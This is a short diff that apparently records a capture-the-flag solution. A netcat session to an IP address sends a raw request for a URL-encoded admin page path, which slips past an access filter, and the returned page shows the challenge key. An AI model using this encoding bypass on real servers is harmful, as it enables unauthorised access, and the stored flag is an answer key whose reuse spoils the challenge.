@@ -1,0 +1,11 @@
+nc 80.251.47.25 80
+GET /%61dministrator.html
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+Key : G1mm3fu3lG1mm3fir3
+</body>
+</html>
